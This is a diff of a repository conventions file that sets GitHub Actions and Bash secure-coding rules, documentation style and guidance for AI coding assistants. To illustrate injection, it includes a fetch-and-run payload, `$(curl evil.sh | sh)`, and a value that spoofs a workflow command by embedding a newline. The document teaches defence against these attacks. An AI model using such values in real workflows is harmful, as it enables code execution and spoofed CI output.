+- **Double-quoting `"${{ ... }}"` directly in the script is never correct, for anything, ever — even for a value that would
+  otherwise be safe to single-quote.** Bash evaluates `$()`/backtick command substitution inside double quotes, so a value
+  containing one (`$(curl evil.sh | sh)`) executes it outright — this is strictly worse than single-quoting an unsafe value,
+  which at least requires a literal `'` to break out rather than a `$(`.
 - **Exception: concatenation with a live shell variable or string** (e.g.
-  `preprocessor_symbols="$preprocessor_symbols;$DISPATCH_PREPROCESSOR_SYMBOLS"`, where
-  `DISPATCH_PREPROCESSOR_SYMBOLS` was itself captured via `env:` first). Capture the `${{ }}` value into its own
-  `env:`-sourced variable, then concatenate that variable — never concatenate a raw `${{ }}` expression directly,
-  even at the tail end of an otherwise-quoted string.
-- **A `${{ }}` value already inside another language's quoting context follows that language's syntax, not this
-  rule.** For example, a `jq` filter passed as `--jq 'map(select(.headRefName == "${{ github.ref_name }}")) | ...'`
-  needs double quotes around the expression because `jq` string literals require them — `jq` has no single-quoted
-  string syntax. The outer single quotes around the whole `--jq '...'` argument already make it literal to bash;
-  changing the inner quotes would break `jq`'s own parsing without improving security. Prefer routing the value
-  through `env:` and a `--arg`/`--argjson` binding instead when the filter's structure allows it, since that also
-  removes the value from the script text entirely.
+  `preprocessor_symbols="$preprocessor_symbols;$DISPATCH_PREPROCESSOR_SYMBOLS"`, where `DISPATCH_PREPROCESSOR_SYMBOLS` was
+  itself captured via `env:` first). Capture the `${{ }}` value into its own `env:`-sourced variable, then concatenate that
+  variable — never concatenate a raw `${{ }}` expression directly, even at the tail end of an otherwise-quoted string.
+- **A `${{ }}` value already inside another language's quoting context follows that language's syntax, not this rule.** For
+  example, a `jq` filter passed as `--jq 'map(select(.headRefName == "${{ github.ref_name }}")) | ...'` needs double quotes
+  around the expression because `jq` string literals require them — `jq` has no single-quoted string syntax. The outer single
+  quotes around the whole `--jq '...'` argument already make it literal to bash; changing the inner quotes would break `jq`'s
+  own parsing without improving security. Prefer routing the value through `env:` and a `--arg`/`--argjson` binding instead when
+  the filter's structure allows it, since that also removes the value from the script text entirely.
 
-### Escaping Free-Form Text in Workflow Commands
+#### Escaping Free-Form Text in Workflow Commands
 
-Routing a value through `env:` (previous section) makes it safe from **shell** injection. It does **not** make it
-safe to print into a **workflow command** (`::notice::`, `::warning::`, `::error::`, `::group::`, etc.) — that is a
-separate parsing layer the GitHub Actions runner applies to a step's stdout, independent of and after the shell.
+Routing a value through `env:` (previous section) makes it safe from **shell** injection. It does **not** make it safe to print
+into a **workflow command** (`::notice::`, `::warning::`, `::error::`, `::group::`, etc.) — that is a separate parsing layer the
+GitHub Actions runner applies to a step's stdout, independent of and after the shell.
 
-- **A workflow command is recognized by the runner scanning the step's entire stdout stream line by line for any
-  line starting with `::` — not just lines your own `printf`/`echo` deliberately wrote as a command.** If a value
-  contains an embedded CR or LF and its raw text reaches stdout by *any* path, the value itself supplies a second
-  "line" in that stream — and if that line happens to start with `::`, the runner treats it as a real command,
-  regardless of what the `printf` that emitted it looked like. A reason like `"fine\n::error::fake failure"` turns
-  one intended `::notice::` into a spoofed `::error::` annotation the workflow never wrote — and the identical thing
-  happens if that same raw reason instead reaches stdout via a plain `## Markdown heading` destined for the step
-  summary, or via a helper like `to_stdout`/`to_summary` that tees its input to both the log and a file. **The
-  trigger condition is "does this value's raw text reach stdout," full stop — not "does my printf look like a `::`
-  command."** A vm2.DevOps workflow shipped exactly this mistake once already: the `::notice::` line was correctly
-  escaped, but a second `printf | to_stdout` right below it, writing an ostensibly-harmless Markdown heading for the
-  step summary, carried the same reason through unescaped — because "it's not a `::` command" was the wrong
-  question to ask.
-- **Always escape with `gh_escape` (`scripts/bash/lib/gh_core.sh`) before interpolating *any*
-  value into a workflow command — the same "always, no judgment call" default as the quoting rule above, and the
-  same pre-approved-list exception** (`github.actor`, `github.event_name`, a literal boolean/numeric constant — the
-  identical list, for the identical reason: nothing else is guaranteed free of CR/LF/`%`). Never `printf %q`.
-  GitHub's own documented workflow-command escaping is `%` -> `%25`,
-  CR -> `%0D`, LF -> `%0A` (percent first, so the `%` introduced by the CR/LF substitutions is not itself
-  re-escaped) — it neutralizes exactly the characters with parsing significance and leaves ordinary punctuation
-  untouched. `printf %q` is a general bash shell-quoting escape: it happens to also remove raw newlines, but it
-  additionally backslash-escapes every shell metacharacter (spaces, commas, parentheses, quotes), so a normal reason
-  like `"fixed a bug, added tests (see #42)"` renders as `fixed\ a\ bug\,\ added\ tests\ \(see\ #42\)` in the Actions
-  UI — correct, but needlessly unreadable.
+- **A workflow command is recognized by the runner scanning the step's entire stdout stream line by line for any line starting
+  with `::` — not just lines your own `printf`/`echo` deliberately wrote as a command.** If a value contains an embedded CR or
+  LF and its raw text reaches stdout by *any* path, the value itself supplies a second "line" in that stream — and if that line
+  happens to start with `::`, the runner treats it as a real command, regardless of what the `printf` that emitted it looked
+  like. A reason like `"fine\n::error::fake failure"` turns one intended `::notice::` into a spoofed `::error::` annotation the
+  workflow never wrote — and the identical thing happens if that same raw reason instead reaches stdout via a plain `## Markdown
+  heading` destined for the step summary, or via a helper like `to_stdout`/`to_summary` that tees its input to both the log and
+  a file. **The trigger condition is "does this value's raw text reach stdout," full stop — not "does my printf look like a `::`
+  command."** A vm2.DevOps workflow shipped exactly this mistake once already: the `::notice::` line was correctly escaped, but
+  a second `printf | to_stdout` right below it, writing an ostensibly-harmless Markdown heading for the step summary, carried
+  the same reason through unescaped — because "it's not a `::` command" was the wrong question to ask.
+- **Always escape with `gh_escape` (`vm2.DevOps/scripts/bash/lib/gh_core.sh`) before interpolating *any* value into a workflow
+  command** — the same "always, no judgment call" default as the quoting rule above, and the same pre-approved-list exception
+  (`github.actor`, `github.event_name`, a literal boolean/numeric constant — the identical list, for the identical reason:
+  nothing else is guaranteed free of CR/LF/`%`). Never `printf %q`. GitHub's own documented workflow-command escaping is `%` ->
+  `%25`, CR -> `%0D`, LF -> `%0A` (percent first, so the `%` introduced by the CR/LF substitutions is not itself re-escaped) —
+  it neutralizes exactly the characters with parsing significance and leaves ordinary punctuation untouched. `printf %q` is a
+  general bash shell-quoting escape: it happens to also remove raw newlines, but it additionally backslash-escapes every shell
+  metacharacter (spaces, commas, parentheses, quotes), so a normal reason like `"fixed a bug, added tests (see #42)"` renders as
+  `fixed\ a\ bug\,\ added\ tests\ \(see\ #42\)` in the Actions UI — correct, but needlessly unreadable.
 
   ```yaml
-  # Preferred: gh_escape once, reuse the escaped value for every stdout destination --
+  # PREFERRED: gh_escape once, reuse the escaped value for every stdout destination --
   # the ::notice:: line AND the step-summary Markdown, since both reach stdout
   - name: Log manual trigger reason
     env:
@@ -589,7 +678,7 @@ separate parsing layer the GitHub Actions runner applies to a step's stdout, ind
         printf '::notice::Manual release triggered by %s. Reason: %s\n' '${{ github.actor }}' "$escaped_reason"
         printf '## Manual trigger\n\n**Reason:** %s\n' "$escaped_reason" | to_stdout
 
-  # Avoid: the second printf looks harmless (no '::' in it) and reuses the already-computed
+  # AVOID: the second printf looks harmless (no '::' in it) and reuses the already-computed
   # escaped_reason, but this variant discards it and pipes the RAW $REASON through to_stdout --
   # to_stdout still writes to the runner's stdout stream, so an embedded CR/LF in $REASON still
   # injects a fake command exactly as if the ::notice:: line itself had been left unescaped
@@ -603,27 +692,26 @@ separate parsing layer the GitHub Actions runner applies to a step's stdout, ind
         printf '## Manual trigger\n\n**Reason:** %s\n' "$REASON" | to_stdout
   ```
 
-- **This is a distinct risk from the shell-injection rule above and does not substitute for it.** A value can be
-  perfectly safe from shell injection (properly routed through `env:`) and still carry an unescaped CR/LF into
-  stdout. Apply both rules together wherever a value's raw text reaches stdout by any path — a `printf`/`echo` that
-  emits a `::` command, or one that doesn't but is piped through `to_stdout`/`to_summary`, or any other route to the
-  step's own stdout:
-  `env:` for the shell, `gh_escape` for the runner's command parser.
+- **This is a distinct risk from the shell-injection rule above and does not substitute for it.** A value can be perfectly safe
+  from shell injection (properly routed through `env:`) and still carry an unescaped CR/LF into stdout. Apply both rules
+  together wherever a value's raw text reaches stdout by any path — a `printf`/`echo` that emits a `::` command, or one that
+  doesn't but is piped through `to_stdout`/`to_summary`, or any other route to the step's own stdout: `env:` for the shell,
+  `gh_escape` for the runner's command parser.
 
-### GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else
+#### GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else
 
-GitHub Actions expressions have no ternary operator; `cond && A || B` is the idiomatic stand-in, mirroring the same
-`A && B || C` pattern bash writers reach for and ShellCheck's SC2015 warns about. Both are the identical trap in
-different languages: the operators chain on **truthiness at each step**, not on `cond` in isolation. If `cond` is
-true but `A` itself evaluates to something falsy (bash: non-zero exit; GitHub Actions: empty string, `false`, `0`,
-`null`), the pair `cond && A` is itself falsy, so `|| B` fires anyway — silently substituting `B` for what should
-have been "true, but empty."
+GitHub Actions expressions have no ternary operator; `cond && A || B` is the idiomatic stand-in, mirroring the same `A && B || C`
+pattern bash writers reach for and ShellCheck's SC2015 warns about. Both are the identical trap in different languages: the
+operators chain on **truthiness at each step**, not on `cond` in isolation. If `cond` is true but `A` itself evaluates to
+something falsy (bash: non-zero exit; GitHub Actions: empty string, `false`, `0`, `null`), the pair `cond && A` is itself falsy,
+so `|| B` fires anyway — silently substituting `B` for what should have been "true, but empty."
 
-- **This bit for real**, in this repo's own `NUGET_API_KEY: ${{ ... nuget-server == 'nuget' &&
-  steps.nuget-login.outputs.NUGET_API_KEY || secrets.NUGET_API_KEY }}`. If the `nuget` (trusted-publishing/OIDC)
-  path's login step ever produced an empty output, `true && ''` collapsed to `''`, and the whole expression silently
-  fell through to a long-lived static secret — defeating the point of trusted publishing by turning a failed OIDC
-  login into a silent credential swap instead of a hard failure.
+- **This actually happened** in the vm2 `Prerelease.yaml` and `Release.yaml` templates, which publish to NuGet through
+  trusted publishing (OIDC):
+  `NUGET_API_KEY: ${{ ... nuget-server == 'nuget' && steps.nuget-login.outputs.NUGET_API_KEY || secrets.NUGET_API_KEY }}`.
+  If the `nuget` (trusted-publishing/OIDC) path's login step ever produced an empty output, `true && ''` collapsed to `''`,
+  and the whole expression silently fell through to a long-lived static secret — defeating the point of trusted publishing by
+  turning a failed OIDC login into a silent credential swap instead of a hard failure.
 - **Fix: gate each branch by its own independent, negated condition — never by the truthiness of the other
   branch's payload.**
 
@@ -637,46 +725,80 @@ have been "true, but empty."
   NUGET_API_KEY: ${{ needs.get-params.outputs.nuget-server == 'nuget' && steps.nuget-login.outputs.NUGET_API_KEY || secrets.NUGET_API_KEY }}
   ```
 
-- **Any `cond && A || B` expression where `A` can legitimately be empty/false/zero MUST be checked for this before
-  it ships**, not only in NuGet publishing — the same shape recurs anywhere a workflow picks between two outputs
-  based on a condition. When in doubt, invert the condition so the branch that can be falsy is the one reached via
-  `||`, not the one gated by `&&`.
+- **Any `cond && A || B` expression where `A` can legitimately be empty/false/zero MUST be checked for this before it ships**,
+  not only in NuGet publishing — the same shape recurs anywhere a workflow picks between two outputs based on a condition. When
+  in doubt, invert the condition so the branch that can be falsy is the one reached via `||`, not the one gated by `&&`.
 
-## Build Configuration, TFMs, RIDs, and Preprocessor Symbols
+### Bash
 
-- **`Directory.Build.props` is the single source of truth for `TargetFramework` and the artifacts output layout**
-  (`ArtifactsPath`, `UseArtifactsOutput`). Workflows and scripts MUST NOT duplicate or override these — they read
-  build output locations, they do not decide them. This extends to every CLI flag and environment variable that
-  threads one of these build-controlled values through a script (`--configuration`/`CONFIGURATION`,
-  `--framework`/`FRAMEWORK`, `--runtime`/`RUNTIME`, `--artifacts-path`/`ARTIFACTS_PATH`, and any
-  `dotnet-version`/`target-framework` workflow input): these exist as escape valves for a rare, deliberate exception,
-  not as a general-purpose override mechanism. If a script or workflow ends up setting one of these to something
-  other than its resolved default, that MUST be justified in writing — a comment at the override site, or the PR
-  description — not merely "because the parameter is there." `Configuration`'s own narrow exception (below) is the
-  model to follow: a named, human-triggered escape hatch with a stated reason, not a value CI computes or forwards by
-  default. Conversely, an input or CLI flag that no caller ever sets to anything but the default is not a reserved
-  knob — it is dead weight that has silently drifted from what the workflow actually does; remove it rather than
-  leave it standing.
-- **The Runtime Identifier (RID) is deliberately left unset (`""`) today.** Every package builds portable,
-  framework-dependent, OS/architecture-agnostic output — no `RuntimeIdentifier` is set anywhere, and the
-  `runtime-identifier` workflow input exists but defaults to unspecified. This is why `runner-os` (and the
-  `runners-os` matrix in `_ci.yaml`) currently only selects which OS *runs* the build/test/benchmark step; it has no
-  effect on the artifact itself, since the output is the same regardless of runner. The input exists precisely so
-  this can change later: **when AOT publishing is introduced, RID becomes mandatory and MUST be derived from the
-  runner**, not hardcoded once for all of them (e.g. `ubuntu-latest` → `linux-x64`, `windows-latest` → `win-x64`,
-  `macos-latest` → `osx-arm64`). Treat `runner-os` as the future RID axis already in place, waiting for AOT to need
-  it.
-- **`Configuration` defaults to `Release`.** Workflow logic MUST NOT branch on or override `Configuration`; it is a
-  manual/CLI override knob (`workflow_dispatch`, local `dotnet build -c ...`) for the rare case a human needs a
-  Debug build, not something CI decides automatically. There is currently no scenario that justifies CI choosing
-  anything else.
-- **Keep the number of CI-driven preprocessor symbols to a minimum.** Today there is exactly one: `SHORT_RUN`,
-  auto-defined by `Directory.Build.props` for local benchmark builds and added explicitly in CI only for a `push` to
-  a non-main branch with no open PR yet (a faster, less comprehensive benchmark run; the PR-triggered run does the
-  full one). Every other CI path (`pull_request`, `workflow_dispatch`, `push` to `main`) leaves
-  `preprocessor-symbols` empty. Adding a new symbol is a deliberate ecosystem-wide decision, not a per-repo
-  convenience — propose it here first.
+The reusable GitHub Actions workflows and the Bash scripts live almost entirely in `vm2.DevOps` — the shared
+function-parameter-validation patterns, the argument-dispatcher ordering rules, the `&&`/`||` precedence pitfall, and the
+long-form-options convention are documented in
+**[`vm2.DevOps/CLAUDE.md`](https://github.com/vmelamed/vm2.DevOps/blob/main/CLAUDE.md)**, instead of being duplicated here for
+every C#-only consumer repo. The other repositories are C#; they also follow the general conventions in this document and the AI
+guidance provided in each repo's CLAUDE.md.
+
+## Documentation
+
+- Documents and blogs **SHOULD** be in Markdown, unless another format is needed for tooling purposes.
+- **Technical and specification documents** **MUST** include the RFC 2119 boilerplate:
+  "The key words **MUST**, **MUST NOT**, **SHOULD**, **SHOULD NOT**, and **MAY** in this document are to be interpreted
+  as described in [RFC 2119](https://www.rfc-editor.org/rfc/rfc2119)."
+- **Blogs and free-form articles** (`docs/blog-*.md`) **MUST NOT** use RFC 2119 keywords as normative terms
+- **Keep comments clear and relevant**; avoid outdated or misleading notes
+- Use clear, concise, idiomatic language; prefer active voice and direct statements
+- Explain the *why* and intent behind decisions, not just the *what*
+- **XML docs on all public API surface**
+- XML tags on their own lines unless the entire XML element fits on one line
+- **Cite specifications** (POSIX, RFC, SemVer, ULID spec, etc.) with title and URL
+- **README code examples MUST be self-contained and runnable**: include all `using` directives, declare all variables,
+  avoid unexplained placeholders. A reader must be able to paste the example and have it compile
+- EBNF (ISO 14977) for grammar definitions: `=` definitions, `,` concatenation, `;` terminator, `[ ]` optional, `|` alternation,
+  `"..."` terminals
+- Standard references block: `[Title](URL) — Author or organization`
+
+### Markdown
+
+- Follow markdownlint default rules (or `.markdownlint.json` if present)
+- **Align Markdown table columns with spaces** so the table is readable in raw Markdown, not only in the rendered view. For
+  readability, table rows **MAY** exceed 128 characters.
+- 4-space indentation for code blocks inside Markdown
+- **Use `1.` for all items in ordered lists** (renderers number automatically)
+- Prefer kebab-case in YAML; avoid snake_case unless required by an external schema
+- **Wrap complete generated Markdown files in tilde fences** (`~~~markdown`) so the user can copy them cleanly
+- Wrap text lines in raw Markdown at 128 characters for readability. A line **MAY** run up to 2 characters over, rather than
+  push a single word or closing punctuation onto the next line.
+
+## For AI Coding Assistants
+
+This section consolidates instructions specifically for AI coding assistants (Claude, Copilot, etc.). The conventions
+in the rest of this document apply to all contributors — human and AI alike.
+
+### Code Generation and File Editing
+
+- **Preserve existing comments** unless correcting inaccuracies or improving English
+- Do not remove commented-out code or configuration comments without explicit permission; however, feel free to *suggest*
+  removal
+- Preserve YAML/JSON/XML comments in configuration files
+- For GitHub Actions workflows: preserve commented-out alternatives and explanatory notes
+- When adding new code, comment on *why* it exists — non-obvious constraints, invariants, workarounds, TODOs with context
+- When refactoring, update affected comments to maintain accuracy
+
+### Language and Writing Quality
+
+The owner of the vm2 repositories is a non-native English speaker.
+
+- Always check spelling, grammar, and technical English in all documentation texts and code comments
+- Recommend better, idiomatic wording for unclear, passive, or awkward sentences
+- Prefer active voice
+- Explain why a suggested change improves the text
+- When suggesting a correction, add one short sentence stating exactly what changed and why — especially for small edits
+  such as punctuation, articles, or word order
+- Examples:
+  - ❌ "The pattern is being matched by the enumerator"
+  - ✅ "The enumerator matches the pattern"
 
 ---
+
 *Canonical source: `vm2.Templates/templates/AddNewPackage/content/.github/CONVENTIONS.md`*
 *Copies maintained by `diff-shared.sh` — edit the canonical copy first.*
